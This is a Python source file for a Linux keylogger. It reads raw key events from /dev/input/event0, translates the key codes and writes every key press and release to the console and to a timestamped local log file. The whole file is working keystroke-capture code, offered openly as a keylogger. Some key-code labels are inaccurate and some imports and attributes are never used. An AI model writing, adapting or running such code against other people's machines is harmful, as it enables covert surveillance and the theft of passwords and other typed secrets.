import psutil
import platform
import subprocess
import datetime
import os
import struct

class KeyLogger:
    def __init__(self):
        self.current_window = None
        self.current_process = None
        self.current_layout = None
        self.log = ""
        self.os_name = platform.system()
        self.filename = f"keylogger_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}_{self.os_name}.txt"
        self.file = open(self.filename, 'a', encoding='utf-8')  # Open log file for writing
        self.xdotool_available = self.check_xdotool() if self.os_name == "Linux" else False

    def check_xdotool(self):
        # Check if xdotool is available on Linux
        try:
            subprocess.check_output(['which', 'xdotool'])
            return True
        except subprocess.CalledProcessError:
            return False

    def log_linux_keystrokes(self):
        device_path = "/dev/input/event0"  # This may vary (e.g., /dev/input/event1)
        if not os.access(device_path, os.R_OK):
            print(f"Access denied to {device_path}. Run as root or adjust permissions.")
            return

        # A dictionary mapping key codes to their characters
        key_map = {
            1: "ESC", 2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9", 11: "0",
            12: "-", 13: "=", 14: "BACKSPACE", 15: "TAB", 16: "q", 17: "w", 18: "e", 19: "r", 20: "t",
            21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "[", 27: "]", 28: "ENTER", 29: "CTRL",
            30: "a", 31: "s", 32: "d", 33: "f", 34: "g", 35: "h", 36: "j", 37: "k", 38: "l", 39: ";",
            40: "'", 41: "`", 42: "SHIFT", 43: "\\", 44: "z", 45: "x", 46: "c", 47: "v", 48: "b",
            49: "n", 50: "m", 51: ",", 52: ".", 53: "/", 54: "SHIFT", 55: "*", 56: "ALT", 57: "SPACE",
            58: "CAPSLOCK", 59: "F1", 60: "F2", 61: "F3", 62: "F4", 63: "F5", 64: "F6", 65: "F7",
            66: "F8", 67: "F9", 68: "F10", 69: "NUMLOCK", 70: "SCROLLLOCK", 71: "KP7", 72: "KP8",
            73: "KP9", 74: "KP-", 75: "KP4", 76: "KP5", 77: "KP6", 78: "KP+", 79: "KP1", 80: "KP2",
            81: "KP3", 82: "KP0", 83: "KP.", 85: "ZENKAKUHANKAKU", 86: "F11", 87: "F12", 88: "RO",
            89: "KATAKANA", 90: "HIRAGANA", 91: "HENKAN", 92: "KATAKANAHIRAGANA", 93: "MUHENKAN",
            94: "KP,", 95: "KPENTER", 96: "RIGHTCTRL", 97: "KPSLASH", 98: "SYSRQ", 99: "RIGHTALT",
            100: "LINEFEED", 101: "HOME", 102: "UP", 103: "PAGEUP", 104: "LEFT", 105: "RIGHT",
            106: "END", 107: "DOWN", 108: "PAGEDOWN", 109: "INSERT", 110: "DELETE", 111: "MACRO",
            112: "MUTE", 113: "VOLUMEDOWN", 114: "VOLUMEUP", 115: "POWER", 116: "KPEQUAL",
            117: "KPPLUSMINUS", 118: "PAUSE", 119: "SCALE", 120: "KPENTER", 121: "LEFTCTRL",
            122: "LEFTALT", 123: "RIGHTMETA", 124: "COMPOSE", 125: "STOP", 126: "AGAIN",
            127: "PROPS", 128: "UNDO", 129: "FRONT", 130: "COPY", 131: "OPEN", 132: "PASTE",
            133: "FIND", 134: "CUT", 135: "HELP", 136: "MENU", 137: "CALC", 138: "SETUP",
            139: "SLEEP", 140: "WAKEUP", 141: "FILE", 142: "SENDFILE", 143: "DELETEFILE",
            144: "XFER", 145: "PROG1", 146: "PROG2", 147: "WWW", 148: "MSDOS", 149: "COFFEE",
            150: "ROTATE_DISPLAY", 151: "CYCLEWINDOWS", 152: "MAIL", 153: "BOOKMARKS",
            154: "COMPUTER", 155: "BACK", 156: "FORWARD", 157: "CLOSECD", 158: "EJECTCD",
            159: "EJECTCLOSECD", 160: "NEXTSONG", 161: "PLAYPAUSE", 162: "PREVIOUSSONG",
            163: "STOPCD", 164: "RECORD", 165: "REWIND", 166: "PHONE", 167: "ISO", 168: "CONFIG",
            169: "HOMEPAGE", 170: "REFRESH", 171: "EXIT", 172: "MOVE", 173: "EDIT", 174: "SCROLLUP",
            175: "SCROLLDOWN", 176: "KPLEFTPAREN", 177: "KPRIGHTPAREN", 178: "NEW", 179: "REDO"
        }

        print(f"Listening for key events on {device_path}...")
        with open(device_path, "rb") as f:
            while True:
                data = f.read(24)  # Reading 24 bytes based on the structure of input_event
                if data:
                    _, _, event_type, code, value = struct.unpack("qqHHI", data)
                    if event_type == 1:  # EV_KEY event
                        key_char = key_map.get(code, f"Unknown({code})")  # Get the mapped character or key code
                        if value == 1:  # Key press
                            log_entry = f"Key pressed: {key_char}\n"
                            print(log_entry.strip())
                            self.file.write(log_entry)
                            self.file.flush()
                        elif value == 0:  # Key release
                            log_entry = f"Key released: {key_char}\n"
                            print(log_entry.strip())
                            self.file.write(log_entry)
                            self.file.flush()

    def start(self):
        if self.os_name == "Linux":
            self.log_linux_keystrokes()
        else:
            print(f"[INFO] Platform {self.os_name} is not supported for this keylogger.")

if __name__ == "__main__":
    keylogger = KeyLogger()
    print("[INFO] Keylogger started.")
    keylogger.start()

